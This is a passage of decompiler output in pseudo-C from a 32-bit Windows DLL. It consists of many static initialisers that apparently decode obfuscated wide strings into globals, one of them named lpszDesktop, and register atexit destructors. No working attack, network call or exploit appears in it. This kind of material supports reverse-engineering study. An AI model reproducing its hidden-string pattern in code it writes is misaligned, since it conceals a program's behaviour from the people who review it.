  v35 = (wchar_t *)sub_1000BE16((int)&unk_10090E10);
  sub_10009D2C(dword_10095228, v35);
  v36 = (wchar_t *)sub_1000BE16((int)&unk_10090DD0);
  sub_10009D2C(dword_10095230, v36);
  v37 = (wchar_t *)sub_1000BE16((int)&unk_10090D94);
  sub_10009D2C(dword_10095238, v37);
  v38 = (wchar_t *)sub_1000BE16((int)&unk_10090D54);
  sub_10009D2C(dword_10095240, v38);
  v39 = (wchar_t *)sub_1000BE16((int)&unk_10090D1C);
  sub_10009D2C(dword_10095248, v39);
  v40 = (wchar_t *)sub_1000BE16((int)&unk_10090C5C);
  sub_10009D2C(dword_10095250, v40);
  v41 = (wchar_t *)sub_1000BE16((int)&unk_10090CDC);
  sub_10009D2C(dword_10095258, v41);
  v42 = (wchar_t *)sub_1000BE16((int)&unk_10090B04);
  sub_10009D2C(dword_10095260, v42);
  v43 = (wchar_t *)sub_1000BE16((int)&unk_10090C98);
  sub_10009D2C(dword_10095268, v43);
  v44 = (wchar_t *)sub_1000BE16((int)&unk_10090C24);
  sub_10009D2C(dword_10095270, v44);
  v45 = (wchar_t *)sub_1000BE16((int)&unk_10090BD8);
  sub_10009D2C(dword_10095278, v45);
  v46 = (wchar_t *)sub_1000BE16((int)&unk_10090B94);
  sub_10009D2C(dword_10095280, v46);
  v47 = (wchar_t *)sub_1000BE16((int)&unk_10090B40);
  sub_10009D2C(dword_10095288, v47);
  v48 = (wchar_t *)sub_1000BE16((int)&unk_10090AC8);
  sub_10009D2C(dword_10095290, v48);
  v49 = (wchar_t *)sub_1000BE16((int)&unk_10090A88);
  sub_10009D2C(dword_10095298, v49);
  v50 = (wchar_t *)sub_1000BE16((int)&unk_10090A50);
  sub_10009D2C(dword_100952A0, v50);
  v51 = (wchar_t *)sub_1000BE16((int)&unk_100908BC);
  sub_10009D2C(dword_100952A8, v51);
  v52 = (wchar_t *)sub_1000BE16((int)&unk_10090A10);
  sub_10009D2C(dword_100952B0, v52);
  v53 = (wchar_t *)sub_1000BE16((int)&unk_100909C8);
  sub_10009D2C(dword_100952B8, v53);
  v54 = (wchar_t *)sub_1000BE16((int)&unk_10090980);
  sub_10009D2C(dword_100952C0, v54);
  v55 = (wchar_t *)sub_1000BE16((int)&unk_1009093C);
  sub_10009D2C(dword_100952C8, v55);
  v56 = (wchar_t *)sub_1000BE16((int)&unk_100908F8);
  sub_10009D2C(dword_100952D0, v56);
  v57 = (wchar_t *)sub_1000BE16((int)&unk_10090878);
  sub_10009D2C(dword_100952D8, v57);
  v58 = (wchar_t *)sub_1000BE16((int)&unk_1009083C);
  sub_10009D2C(dword_100952E0, v58);
  v59 = (wchar_t *)sub_1000BE16((int)&unk_100907FC);
  sub_10009D2C(dword_100952E8, v59);
  v60 = (wchar_t *)sub_1000BE16((int)&unk_100907B0);
  sub_10009D2C(dword_100952F0, v60);
  v61 = (wchar_t *)sub_1000BE16((int)&unk_10090774);
  sub_10009D2C(dword_100952F8, v61);
  v62 = (wchar_t *)sub_1000BE16((int)&unk_10090730);
  sub_10009D2C(dword_10095300, v62);
  v63 = (wchar_t *)sub_1000BE16((int)&unk_100906F0);
  sub_10009D2C(dword_10095308, v63);
  v64 = (wchar_t *)sub_1000BE16((int)&unk_100906A0);
  sub_10009D2C(dword_10095310, v64);
  v65 = (wchar_t *)sub_1000BE16((int)&unk_10090660);
  sub_10009D2C(dword_10095318, v65);
  v66 = (wchar_t *)sub_1000BE16((int)&unk_10090620);
  sub_10009D2C(dword_10095320, v66);
  v67 = (wchar_t *)sub_1000BE16((int)&unk_100905E8);
  sub_10009D2C(dword_10095328, v67);
  v68 = (wchar_t *)sub_1000BE16((int)&unk_1009056C);
  sub_10009D2C(dword_10095330, v68);
  v69 = (wchar_t *)sub_1000BE16((int)&unk_100905A8);
  sub_10009D2C(dword_10095338, v69);
  v70 = (wchar_t *)sub_1000BE16((int)&unk_10090530);
  sub_10009D2C(dword_10095340, v70);
  v71 = (wchar_t *)sub_1000BE16((int)&unk_100904F0);
  sub_10009D2C(dword_10095348, v71);
  v72 = (wchar_t *)sub_1000BE16((int)&unk_100904B4);
  sub_10009D2C(dword_10095350, v72);
  v73 = (wchar_t *)sub_1000BE16((int)&unk_100903F4);
  sub_10009D2C(dword_10095358, v73);
  v74 = (wchar_t *)sub_1000BE16((int)&unk_10090474);
  sub_10009D2C(dword_10095360, v74);
  v75 = (wchar_t *)sub_1000BE16((int)&unk_10090430);
  sub_10009D2C(dword_10095368, v75);
  v76 = (wchar_t *)sub_1000BE16((int)&unk_100903B8);
  sub_10009D2C(dword_10095370, v76);
  v77 = (wchar_t *)sub_1000BE16((int)&unk_1009037C);
  sub_10009D2C(dword_10095378, v77);
  v78 = (wchar_t *)sub_1000BE16((int)&unk_10090340);
  sub_10009D2C(dword_10095380, v78);
  v79 = (wchar_t *)sub_1000BE16((int)&unk_10090300);
  sub_10009D2C(dword_10095388, v79);
  v80 = (wchar_t *)sub_1000BE16((int)&unk_100902BC);
  sub_10009D2C(dword_10095390, v80);
  v81 = (wchar_t *)sub_1000BE16((int)&unk_100901E4);
  sub_10009D2C(dword_10095398, v81);
  v82 = (wchar_t *)sub_1000BE16((int)&unk_10090270);
  sub_10009D2C(dword_100953A0, v82);
  v83 = (wchar_t *)sub_1000BE16((int)&unk_10090220);
  sub_10009D2C(dword_100953A8, v83);
  v84 = (wchar_t *)sub_1000BE16((int)&unk_10090180);
  sub_10009D2C(dword_100953B0, v84);
  v85 = (wchar_t *)sub_1000BE16((int)&unk_10090140);
  sub_10009D2C(dword_100953B8, v85);
  v86 = (wchar_t *)sub_1000BE16((int)&unk_10090104);
  sub_10009D2C(dword_100953C0, v86);
  v87 = (wchar_t *)sub_1000BE16((int)&unk_100900C4);
  sub_10009D2C(dword_100953C8, v87);
  v88 = (wchar_t *)sub_1000BE16((int)&unk_10090088);
  sub_10009D2C(dword_100953D0, v88);
  v89 = (wchar_t *)sub_1000BE16((int)&unk_10090050);
  sub_10009D2C(dword_100953D8, v89);
  v90 = (wchar_t *)sub_1000BE16((int)&unk_10090000);
  sub_10009D2C(dword_100953E0, v90);
  v91 = (wchar_t *)sub_1000BE16((int)&unk_1008FFC0);
  sub_10009D2C(dword_100953E8, v91);
  v92 = (wchar_t *)sub_1000BE16((int)&unk_1008FF68);
  sub_10009D2C(dword_100953F0, v92);
  v93 = (wchar_t *)sub_1000BE16((int)&unk_1008FF08);
  sub_10009D2C(dword_100953F8, v93);
  v94 = (wchar_t *)sub_1000BE16((int)&unk_1008FED0);
  sub_10009D2C(dword_10095400, v94);
  return atexit(sub_1006CCEA);
}
// 10095110: using guessed type _DWORD dword_10095110[2];
// 10095118: using guessed type _DWORD dword_10095118[2];
// 10095120: using guessed type _DWORD dword_10095120[2];
// 10095128: using guessed type _DWORD dword_10095128[2];
// 10095130: using guessed type _DWORD dword_10095130[2];
// 10095138: using guessed type _DWORD dword_10095138[2];
// 10095140: using guessed type _DWORD dword_10095140[2];
// 10095148: using guessed type _DWORD dword_10095148[2];
// 10095150: using guessed type _DWORD dword_10095150[2];
// 10095158: using guessed type _DWORD dword_10095158[2];
// 10095160: using guessed type _DWORD dword_10095160[2];
// 10095168: using guessed type _DWORD dword_10095168[2];
// 10095170: using guessed type _DWORD dword_10095170[2];
// 10095178: using guessed type _DWORD dword_10095178[2];
// 10095180: using guessed type _DWORD dword_10095180[2];
// 10095188: using guessed type _DWORD dword_10095188[2];
// 10095190: using guessed type _DWORD dword_10095190[2];
// 10095198: using guessed type _DWORD dword_10095198[2];
// 100951A0: using guessed type _DWORD dword_100951A0[2];
// 100951A8: using guessed type _DWORD dword_100951A8[2];
// 100951B0: using guessed type _DWORD dword_100951B0[2];
// 100951B8: using guessed type _DWORD dword_100951B8[2];
// 100951C0: using guessed type _DWORD dword_100951C0[2];
// 100951C8: using guessed type _DWORD dword_100951C8[2];
// 100951D0: using guessed type _DWORD dword_100951D0[2];
// 100951D8: using guessed type _DWORD dword_100951D8[2];
// 100951E0: using guessed type _DWORD dword_100951E0[2];
// 100951E8: using guessed type _DWORD dword_100951E8[2];
// 100951F0: using guessed type _DWORD dword_100951F0[2];
// 100951F8: using guessed type _DWORD dword_100951F8[2];
// 10095200: using guessed type _DWORD dword_10095200[2];
// 10095208: using guessed type _DWORD dword_10095208[2];
// 10095210: using guessed type _DWORD dword_10095210[2];
// 10095218: using guessed type _DWORD dword_10095218[2];
// 10095220: using guessed type _DWORD dword_10095220[2];
// 10095228: using guessed type _DWORD dword_10095228[2];
// 10095230: using guessed type _DWORD dword_10095230[2];
// 10095238: using guessed type _DWORD dword_10095238[2];
// 10095240: using guessed type _DWORD dword_10095240[2];
// 10095248: using guessed type _DWORD dword_10095248[2];
// 10095250: using guessed type _DWORD dword_10095250[2];
// 10095258: using guessed type _DWORD dword_10095258[2];
// 10095260: using guessed type _DWORD dword_10095260[2];
// 10095268: using guessed type _DWORD dword_10095268[2];
// 10095270: using guessed type _DWORD dword_10095270[2];
// 10095278: using guessed type _DWORD dword_10095278[2];
// 10095280: using guessed type _DWORD dword_10095280[2];
// 10095288: using guessed type _DWORD dword_10095288[2];
// 10095290: using guessed type _DWORD dword_10095290[2];
// 10095298: using guessed type _DWORD dword_10095298[2];
// 100952A0: using guessed type _DWORD dword_100952A0[2];
// 100952A8: using guessed type _DWORD dword_100952A8[2];
// 100952B0: using guessed type _DWORD dword_100952B0[2];
// 100952B8: using guessed type _DWORD dword_100952B8[2];
// 100952C0: using guessed type _DWORD dword_100952C0[2];
// 100952C8: using guessed type _DWORD dword_100952C8[2];
// 100952D0: using guessed type _DWORD dword_100952D0[2];
// 100952D8: using guessed type _DWORD dword_100952D8[2];
// 100952E0: using guessed type _DWORD dword_100952E0[2];
// 100952E8: using guessed type _DWORD dword_100952E8[2];
// 100952F0: using guessed type _DWORD dword_100952F0[2];
// 100952F8: using guessed type _DWORD dword_100952F8[2];
// 10095300: using guessed type _DWORD dword_10095300[2];
// 10095308: using guessed type _DWORD dword_10095308[2];
// 10095310: using guessed type _DWORD dword_10095310[2];
// 10095318: using guessed type _DWORD dword_10095318[2];
// 10095320: using guessed type _DWORD dword_10095320[2];
// 10095328: using guessed type _DWORD dword_10095328[2];
// 10095330: using guessed type _DWORD dword_10095330[2];
// 10095338: using guessed type _DWORD dword_10095338[2];
// 10095340: using guessed type _DWORD dword_10095340[2];
// 10095348: using guessed type _DWORD dword_10095348[2];
// 10095350: using guessed type _DWORD dword_10095350[2];
// 10095358: using guessed type _DWORD dword_10095358[2];
// 10095360: using guessed type _DWORD dword_10095360[2];
// 10095368: using guessed type _DWORD dword_10095368[2];
// 10095370: using guessed type _DWORD dword_10095370[2];
// 10095378: using guessed type _DWORD dword_10095378[2];
// 10095380: using guessed type _DWORD dword_10095380[2];
// 10095388: using guessed type _DWORD dword_10095388[2];
// 10095390: using guessed type _DWORD dword_10095390[2];
// 10095398: using guessed type _DWORD dword_10095398[2];
// 100953A0: using guessed type _DWORD dword_100953A0[2];
// 100953A8: using guessed type _DWORD dword_100953A8[2];
// 100953B0: using guessed type _DWORD dword_100953B0[2];
// 100953B8: using guessed type _DWORD dword_100953B8[2];
// 100953C0: using guessed type _DWORD dword_100953C0[2];
// 100953C8: using guessed type _DWORD dword_100953C8[2];
// 100953D0: using guessed type _DWORD dword_100953D0[2];
// 100953D8: using guessed type _DWORD dword_100953D8[2];
// 100953E0: using guessed type _DWORD dword_100953E0[2];
// 100953E8: using guessed type _DWORD dword_100953E8[2];
// 100953F0: using guessed type _DWORD dword_100953F0[2];
// 100953F8: using guessed type _DWORD dword_100953F8[2];
// 10095400: using guessed type _DWORD dword_10095400[2];

//----- (1006C1BC) --------------------------------------------------------
int sub_1006C1BC()
{
  int v1[2]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  sub_10009D2C(v1, &word_1008FD3C);
  v2 = 0;
  sub_1000EF5A(v1, dword_10095420, 0, 0);
  v2 = -1;
  sub_10009F65(v1);
  return atexit(sub_1006CCFE);
}
// 10095420: using guessed type int dword_10095420[3];

//----- (1006C20D) --------------------------------------------------------
int sub_1006C20D()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008FD40);
  sub_10009D2C(dword_1009542C, v0);
  return atexit(sub_1006CD08);
}
// 1009542C: using guessed type _DWORD dword_1009542C[2];

//----- (1006C22F) --------------------------------------------------------
int sub_1006C22F()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008FD88);
  sub_10009D2C(dword_10095418, v0);
  return atexit(sub_1006CD12);
}
// 10095418: using guessed type _DWORD dword_10095418[2];

//----- (1006C251) --------------------------------------------------------
int sub_1006C251()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008FDD0);
  sub_10009D2C(dword_10095434, v0);
  return atexit(sub_1006CD1C);
}
// 10095434: using guessed type _DWORD dword_10095434[2];

//----- (1006C273) --------------------------------------------------------
int sub_1006C273()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008FE20);
  sub_10009D2C(dword_10095410, v0);
  return atexit(sub_1006CD26);
}
// 10095410: using guessed type _DWORD dword_10095410[2];

//----- (1006C295) --------------------------------------------------------
int sub_1006C295()
{
  int v1[2]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  sub_10009D2C(v1, &word_1008FC14);
  v2 = 0;
  sub_1000EF5A(v1, dword_1009544C, 0, 0);
  v2 = -1;
  sub_10009F65(v1);
  return atexit(sub_1006CD30);
}
// 1009544C: using guessed type int dword_1009544C[3];

//----- (1006C2E6) --------------------------------------------------------
int sub_1006C2E6()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008FC18);
  sub_10009D2C(dword_10095458, v0);
  return atexit(sub_1006CD3A);
}
// 10095458: using guessed type _DWORD dword_10095458[2];

//----- (1006C308) --------------------------------------------------------
int sub_1006C308()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008FC60);
  sub_10009D2C(dword_10095444, v0);
  return atexit(sub_1006CD44);
}
// 10095444: using guessed type _DWORD dword_10095444[2];

//----- (1006C32A) --------------------------------------------------------
int sub_1006C32A()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008FCA8);
  sub_10009D2C(dword_10095460, v0);
  return atexit(sub_1006CD4E);
}
// 10095460: using guessed type _DWORD dword_10095460[2];

//----- (1006C34C) --------------------------------------------------------
int sub_1006C34C()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008FCF8);
  sub_10009D2C(dword_1009543C, v0);
  return atexit(sub_1006CD58);
}
// 1009543C: using guessed type _DWORD dword_1009543C[2];

//----- (1006C36E) --------------------------------------------------------
int sub_1006C36E()
{
  sub_10012CF1((int)dword_100957B4);
  return atexit(sub_1006CD6C);
}
// 100957B4: using guessed type int dword_100957B4[9];

//----- (1006C384) --------------------------------------------------------
int sub_1006C384()
{
  return atexit(sub_1006CD62);
}

//----- (1006C390) --------------------------------------------------------
int sub_1006C390()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v3[2]; // [esp+4h] [ebp-14h] BYREF
  int v4; // [esp+14h] [ebp-4h]

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008FB40);
  v1 = sub_10009D2C(v3, v0);
  v4 = 0;
  sub_1000C312((int)v1, (int)dword_1009547C);
  v4 = -1;
  sub_10009F65(v3);
  return atexit(sub_1006CD76);
}
// 1009547C: using guessed type int dword_1009547C[5];

//----- (1006C3E6) --------------------------------------------------------
int sub_1006C3E6()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v3[2]; // [esp+4h] [ebp-14h] BYREF
  int v4; // [esp+14h] [ebp-4h]

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008FB70);
  v1 = sub_10009D2C(v3, v0);
  v4 = 0;
  sub_1000C312((int)v1, (int)dword_10095468);
  v4 = -1;
  sub_10009F65(v3);
  return atexit(sub_1006CD80);
}
// 10095468: using guessed type int dword_10095468[3];

//----- (1006C43C) --------------------------------------------------------
int sub_1006C43C()
{
  int result; // eax

  result = dword_10095474;
  dword_10095490 = dword_10095474;
  return result;
}
// 10095474: using guessed type int dword_10095474;
// 10095490: using guessed type int dword_10095490;

//----- (1006C447) --------------------------------------------------------
int sub_1006C447()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v3[2]; // [esp+4h] [ebp-14h] BYREF
  int v4; // [esp+14h] [ebp-4h]

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008FAD8);
  v1 = sub_10009D2C(v3, v0);
  v4 = 0;
  sub_1000C312((int)v1, (int)dword_100954A8);
  v4 = -1;
  sub_10009F65(v3);
  return atexit(sub_1006CD8A);
}
// 100954A8: using guessed type int dword_100954A8[5];

//----- (1006C49D) --------------------------------------------------------
int sub_1006C49D()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v3[2]; // [esp+4h] [ebp-14h] BYREF
  int v4; // [esp+14h] [ebp-4h]

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008FB08);
  v1 = sub_10009D2C(v3, v0);
  v4 = 0;
  sub_1000C312((int)v1, (int)dword_10095494);
  v4 = -1;
  sub_10009F65(v3);
  return atexit(sub_1006CD94);
}
// 10095494: using guessed type int dword_10095494[3];

//----- (1006C4F3) --------------------------------------------------------
int sub_1006C4F3()
{
  int result; // eax

  result = dword_100954A0;
  dword_100954BC = dword_100954A0;
  return result;
}
// 100954A0: using guessed type int dword_100954A0;
// 100954BC: using guessed type int dword_100954BC;

//----- (1006C4FE) --------------------------------------------------------
int sub_1006C4FE()
{
  sub_100050B4();
  return atexit(sub_1006CD9E);
}

//----- (1006C50F) --------------------------------------------------------
int sub_1006C50F()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008FA88);
  sub_10009D2C(&dword_100954D0, v0);
  return atexit(sub_1006CDA8);
}
// 100954D0: using guessed type int dword_100954D0;

//----- (1006C531) --------------------------------------------------------
int sub_1006C531()
{
  sub_10004E9B(dword_100954D8);
  return atexit(sub_1006CDB2);
}
// 100954D8: using guessed type int dword_100954D8[4];

//----- (1006C547) --------------------------------------------------------
int sub_1006C547()
{
  sub_10012CF1((int)dword_100957D8);
  return atexit(sub_1006CDC7);
}
// 100957D8: using guessed type int dword_100957D8[9];

//----- (1006C55D) --------------------------------------------------------
int sub_1006C55D()
{
  return atexit(sub_1006CDBD);
}

//----- (1006C569) --------------------------------------------------------
const CHAR *sub_1006C569()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_1000BDCC((int)&unk_1008FA50);
  lpszDesktop = result;
  return result;
}

//----- (1006C57A) --------------------------------------------------------
int sub_1006C57A()
{
  int v1[2]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  sub_10009D2C(v1, &word_1008F928);
  v2 = 0;
  sub_1000EF5A(v1, dword_100954F8, 0, 0);
  v2 = -1;
  sub_10009F65(v1);
  return atexit(sub_1006CDD1);
}
// 100954F8: using guessed type int dword_100954F8[3];

//----- (1006C5CB) --------------------------------------------------------
int sub_1006C5CB()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008F930);
  sub_10009D2C(dword_10095504, v0);
  return atexit(sub_1006CDDB);
}
// 10095504: using guessed type _DWORD dword_10095504[2];

//----- (1006C5ED) --------------------------------------------------------
int sub_1006C5ED()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008F978);
  sub_10009D2C(dword_100954F0, v0);
  return atexit(sub_1006CDE5);
}
// 100954F0: using guessed type _DWORD dword_100954F0[2];

//----- (1006C60F) --------------------------------------------------------
int sub_1006C60F()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008F9C0);
  sub_10009D2C(dword_1009550C, v0);
  return atexit(sub_1006CDEF);
}
// 1009550C: using guessed type _DWORD dword_1009550C[2];

//----- (1006C631) --------------------------------------------------------
int sub_1006C631()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008FA10);
  sub_10009D2C(dword_100954E8, v0);
  return atexit(sub_1006CDF9);
}
// 100954E8: using guessed type _DWORD dword_100954E8[2];

//----- (1006C653) --------------------------------------------------------
int sub_1006C653()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008F8C8);
  sub_10009D2C(dword_10095514, v0);
  return atexit(sub_1006CE03);
}
// 10095514: using guessed type _DWORD dword_10095514[2];

//----- (1006C675) --------------------------------------------------------
int sub_1006C675()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008F784);
  sub_10009D2C(dword_1009551C, v0);
  return atexit(sub_1006CE0D);
}
// 1009551C: using guessed type _DWORD dword_1009551C[2];

//----- (1006C697) --------------------------------------------------------
int sub_1006C697()
{
  sub_10025707(&dword_10095524);
  return atexit(sub_1006CE17);
}
// 10095524: using guessed type _DWORD dword_10095524;

//----- (1006C6AF) --------------------------------------------------------
int sub_1006C6AF()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008F538);
  sub_10009D2C(dword_1009553C, v0);
  return atexit(sub_1006CE21);
}
// 1009553C: using guessed type _DWORD dword_1009553C[2];

//----- (1006C6D1) --------------------------------------------------------
int sub_1006C6D1()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008F5A0);
  sub_10009D2C(dword_10095534, v0);
  return atexit(sub_1006CE2B);
}
// 10095534: using guessed type _DWORD dword_10095534[2];

//----- (1006C6F3) --------------------------------------------------------
int sub_1006C6F3()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008F61C);
  sub_10009D2C(dword_1009552C, v0);
  return atexit(sub_1006CE35);
}
// 1009552C: using guessed type _DWORD dword_1009552C[2];

//----- (1006C715) --------------------------------------------------------
int sub_1006C715()
{
  sub_10012CF1((int)dword_100957FC);
  return atexit(sub_1006CE49);
}
// 100957FC: using guessed type int dword_100957FC[9];

//----- (1006C72B) --------------------------------------------------------
int sub_1006C72B()
{
  return atexit(sub_1006CE3F);
}

//----- (1006C737) --------------------------------------------------------
int sub_1006C737()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008EF94);
  sub_10009D2C(dword_1009556C, v0);
  return atexit(sub_1006CE53);
}
// 1009556C: using guessed type _DWORD dword_1009556C[2];

//----- (1006C759) --------------------------------------------------------
int sub_1006C759()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008EFD0);
  sub_10009D2C(dword_10095574, v0);
  return atexit(sub_1006CE5D);
}
// 10095574: using guessed type _DWORD dword_10095574[2];

//----- (1006C77B) --------------------------------------------------------
int sub_1006C77B()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008F018);
  sub_10009D2C(&dword_10095554, v0);
  return atexit(sub_1006CE67);
}
// 10095554: using guessed type int dword_10095554;

//----- (1006C79D) --------------------------------------------------------
int sub_1006C79D()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008F088);
  sub_10009D2C(&dword_1009554C, v0);
  return atexit(sub_1006CE71);
}
// 1009554C: using guessed type int dword_1009554C;

//----- (1006C7BF) --------------------------------------------------------
int sub_1006C7BF()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008F0C8);
  sub_10009D2C(dword_10095544, v0);
  return atexit(sub_1006CE7B);
}
// 10095544: using guessed type _DWORD dword_10095544[2];

//----- (1006C7E1) --------------------------------------------------------
int sub_1006C7E1()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008F110);
  sub_10009D2C(&dword_10095564, v0);
  return atexit(sub_1006CE85);
}
// 10095564: using guessed type int dword_10095564;

//----- (1006C803) --------------------------------------------------------
int sub_1006C803()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008F170);
  sub_10009D2C(&dword_1009555C, v0);
  return atexit(sub_1006CE8F);
}
// 1009555C: using guessed type int dword_1009555C;

//----- (1006C825) --------------------------------------------------------
int sub_1006C825()
{
  return atexit(nullsub_4);
}

//----- (1006C831) --------------------------------------------------------
int sub_1006C831()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008ED14);
  sub_10009D2C(dword_100955A8, v0);
  return atexit(sub_1006CE9A);
}
// 100955A8: using guessed type _DWORD dword_100955A8[2];

//----- (1006C853) --------------------------------------------------------
int sub_1006C853()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008ED44);
  sub_10009D2C(dword_10095598, v0);
  return atexit(sub_1006CEA4);
}
// 10095598: using guessed type _DWORD dword_10095598[2];

//----- (1006C875) --------------------------------------------------------
int sub_1006C875()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008ED74);
  sub_10009D2C(dword_100955A0, v0);
  return atexit(sub_1006CEAE);
}
// 100955A0: using guessed type _DWORD dword_100955A0[2];

//----- (1006C897) --------------------------------------------------------
int sub_1006C897()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008EDA4);
  sub_10009D2C(dword_10095580, v0);
  return atexit(sub_1006CEB8);
}
// 10095580: using guessed type _DWORD dword_10095580[2];

//----- (1006C8B9) --------------------------------------------------------
int sub_1006C8B9()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008EDD4);
  sub_10009D2C(dword_10095590, v0);
  return atexit(sub_1006CEC2);
}
// 10095590: using guessed type _DWORD dword_10095590[2];

//----- (1006C8DB) --------------------------------------------------------
int sub_1006C8DB()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008EE04);
  sub_10009D2C(dword_10095588, v0);
  return atexit(sub_1006CECC);
}
// 10095588: using guessed type _DWORD dword_10095588[2];

//----- (1006C8FD) --------------------------------------------------------
int sub_1006C8FD()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008ECE8);
  sub_10009D2C(&dword_100955B0, v0);
  return atexit(sub_1006CED6);
}
// 100955B0: using guessed type int dword_100955B0;

//----- (1006C91F) --------------------------------------------------------
int sub_1006C91F()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008E9C0);
  sub_10009D2C(dword_100955B8, v0);
  return atexit(sub_1006CEE0);
}
// 100955B8: using guessed type _DWORD dword_100955B8[2];

//----- (1006C941) --------------------------------------------------------
char *sub_1006C941()
{
  char *result; // eax

  result = (char *)sub_1000BDCC((int)&unk_1008E9FC);
  dword_10091B00 = result;
  return result;
}

//----- (1006C952) --------------------------------------------------------
char *sub_1006C952()
{
  char *result; // eax

  result = (char *)sub_1000BDCC((int)&unk_1008EA1C);
  dword_10091AFC = result;
  return result;
}

//----- (1006C963) --------------------------------------------------------
int sub_1006C963()
{
  int v1[11]; // [esp+0h] [ebp-2Ch] BYREF

  v1[7] = (int)v1;
  sub_100268EB(v1, 0);
  v1[10] = -1;
  sub_10020B54(v1[0], v1[1], (HANDLE)v1[2]);
  return atexit(sub_1006CEEA);
}

//----- (1006C99D) --------------------------------------------------------
int sub_1006C99D()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008E86C);
  sub_10009D2C(dword_100955C0, v0);
  return atexit(sub_1006CEF4);
}
// 100955C0: using guessed type _DWORD dword_100955C0[2];

//----- (1006C9BF) --------------------------------------------------------
int sub_1006C9BF()
{
  sub_10009D2C(dword_100955C8, asc_1008E858);
  return atexit(sub_1006CEFE);
}
// 100955C8: using guessed type _DWORD dword_100955C8[2];

//----- (1006C9DA) --------------------------------------------------------
int sub_1006C9DA()
{
  sub_10009D2C(dword_100955D0, &word_1008E85C);
  return atexit(sub_1006CF08);
}
// 100955D0: using guessed type _DWORD dword_100955D0[2];

//----- (1006C9F5) --------------------------------------------------------
int sub_1006C9F5()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008E728);
  sub_10009D2C(dword_100955E8, v0);
  return atexit(sub_1006CF12);
}
// 100955E8: using guessed type _DWORD dword_100955E8[2];

//----- (1006CA17) --------------------------------------------------------
int sub_1006CA17()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008E6F4);
  sub_10009D2C(dword_100955D8, v0);
  return atexit(sub_1006CF1C);
}
// 100955D8: using guessed type _DWORD dword_100955D8[2];

//----- (1006CA39) --------------------------------------------------------
int sub_1006CA39()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008E768);
  sub_10009D2C(dword_100955E0, v0);
  return atexit(sub_1006CF26);
}
// 100955E0: using guessed type _DWORD dword_100955E0[2];

//----- (1006CA5B) --------------------------------------------------------
int sub_1006CA5B()
{
  sub_100268AE(dword_10095820);
  return atexit(sub_1006CF30);
}
// 10095820: using guessed type _DWORD dword_10095820[3];

//----- (1006CA71) --------------------------------------------------------
int sub_1006CA71()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008E5D0);
  sub_10009D2C(dword_10095608, v0);
  return atexit(sub_1006CF3A);
}
// 10095608: using guessed type _DWORD dword_10095608[2];

